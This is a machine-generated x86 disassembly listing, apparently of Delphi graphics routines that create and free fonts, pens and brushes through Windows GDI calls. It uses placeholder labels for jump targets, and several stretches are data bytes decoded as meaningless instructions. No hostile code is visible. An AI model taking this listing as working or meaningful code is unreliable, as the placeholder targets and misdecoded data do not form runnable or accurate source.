sbb al 0x2a
jae r-xdata
inc edx
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ eax ] ch
inc eax
add al dl
xor [ eax ] eax
or al 0x64
sbb al 0x42
add [ ecx + ebx + 0x42 ] dl
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
sbb eax 0x42
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
pop eax
sbb eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
sbb eax 0x80042
add [ eax ] al
or [ ecx ] dl
inc eax
sub_421fb9
cwde
inc edx
add [ eax ] al
xchg [ edx ] eax
pushad
xchg [ edx ] eax
pushfd
xchg edx eax
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x421fd470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x421f5870
add [ eax ] dh
sbb eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx ] eax
xor al 0x0
add [ eax ] al
insb
sbb al [ edx ]
xor al 0x40
add ah ah
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + ebx * 4 ] ch
inc edx
add [ eax + ebp * 4 ] ah
inc ecx
add ah ch
push ebx
inc edx
add [ edx + ebx * 4 + 0x42 ] bl
add [ ecx + ebp * 4 + 0x41 ] dh
add [ ebx + edx * 2 + 0x42 ] bh
add [ edx + ebx * 4 + 0x54380042 ] bh
inc edx
add ah bh
0x9b280042 0x42
adc [ ebp + 0x42 ] 0x0
test [ ebp + 0x42 ] dl
add [ ebx + ebx * 4 ] bh
inc edx
add [ esi + edx * 2 ] al
inc edx
add al al
popfd
inc edx
add [ eax + 0x56 ] ch
inc edx
add al bl
popfd
inc edx
add ah bl
popfd
inc edx
add [ esi + edx * 2 + 0x42 ] bh
add al bl
cdq
inc edx
add [ eax + 0x10004255 ] cl
push esi
inc edx
add [ esp + ebx * 4 + 0x42 ] bh
add ah dh
popfd
inc edx
add [ esi + ebx * 4 ] bl
inc edx
add [ eax ] dh
sahf
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
or al 0x21
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
pushfd
and [ edx ] al
xor [ ebx ] bl
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
inc eax
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ edx ] al
sbb [ eax ] al
add [ eax ] al
or al 0x1d
inc edx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x3fffbd67 ] dl
cdq
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
pushfd
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x21
inc eax
add ah ch
and [ edx ] eax
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
jo r-xdata
inc ecx
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403590
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_42213c
mov [ ecx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004221 ] cl
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah ch
and [ edx ] eax
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
inc ecx
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4221b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4221ec
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_422228
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_42219c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422210
xor edx edx
push ebp
push sub_4222fc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422303
mov eax [ ebp - 0x4 ]
call sub_42221c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_40278c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402988
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407f98
test al al
je r-xdata
sub_42230c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422210
xor ecx ecx
push ebp
push sub_422393
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42221c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_4223bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422210
xor eax eax
push ebp
push sub_422425
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422228
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_42230c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42242c
mov eax [ ebp - 0x4 ]
call sub_42221c
retn
mov eax ebx
mov si 0xfffd
call sub_403418
sub_422434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422210
xor eax eax
push ebp
push sub_422490
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422497
mov eax [ ebp - 0x4 ]
call sub_42221c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403418
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42230c
sub_4224a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422210
xor edx edx
push ebp
push sub_4224ff
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422506
mov eax [ ebp - 0x4 ]
call sub_42221c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_42250c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4225a9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a19c
mov ebx eax
mov eax ebx
call sub_423ad8
inc [ ebp - 0x4 ]
mov eax ebx
call sub_423dec
mov eax [ rw-data ]
call sub_4224a0
mov eax [ rw-data ]
call sub_4224a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225b0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41a19c
call sub_423cc4
inc esi
dec ebx
jne r-xdata
sub_422bff
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_419c4c
retn
sub_422c30
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d30
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b20
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_422ce4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422228
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_422d38
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42230c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_422d7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a740
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_422e37
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422a3c
xor eax eax
push ebp
push sub_422e1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422434
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_422eb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e21
mov eax [ ebp - 0x8 ]
call sub_422a4c
retn
mov eax ebx
call sub_42313c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423158
sub_422e68
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_422ead
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4223bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422eb4
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_422ecc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423055
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42305c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f90
retn
mov eax [ rw-data ]
call sub_422210
xor eax eax
push ebp
push sub_42302d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42221c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041d0
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408928
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041d0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408928
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041d0
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4080d0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_4231b0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423074
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_422c30
mov edx esp
mov eax ebx
call sub_422e68
add esp 0x2c
pop esi
pop ebx
retn
sub_4230a0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_422e50
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_422e68
add esp 0x2c
pop esi
pop ebx
retn
sub_4230e0
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_422e50
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c30
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404208
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b20
mov edx esp
mov eax ebx
call sub_422e68
sub_423158
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4230a0
pop esi
pop ebx
retn
sub_423184
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_422e50
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_422e68
add esp 0x30
pop ebx
retn
sub_4231b8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_422e50
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_422e68
add esp 0x2c
pop esi
pop ebx
retn
sub_4231e8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_422e50
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_422e68
add esp 0x2c
pop esi
pop ebx
retn
sub_423210
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422228
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_423254
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42230c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42327c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a740
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_42331b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422a3c
xor eax eax
push ebp
push sub_4232fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422434
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423464
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423305
mov eax [ ebp - 0x8 ]
call sub_422a4c
retn
sub_423334
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42334c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_423391
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4223bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423398
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_4233a4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423334
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_42334c
add esp 0x10
pop esi
pop ebx
retn
sub_4233cc
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422210
xor eax eax
push ebp
push sub_423452
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42221c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4229f8
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_423480
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423334
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_42334c
add esp 0x10
pop esi
pop ebx
retn
sub_4234b0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423334
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_42334c
sub_4234dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422228
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42351c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42230c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_423544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a740
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_4235d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422a3c
xor eax eax
push ebp
push sub_4235b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422434
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4235be
mov eax [ ebp - 0x8 ]
call sub_422a4c
retn
sub_4235ec
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_423608
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422a3c
xor eax eax
push ebp
push sub_42364d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4223bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423654
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_423658
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_423608
add esp 0x10
pop edi
pop esi
retn
sub_423684
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4235ec
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_423608
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_4236b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
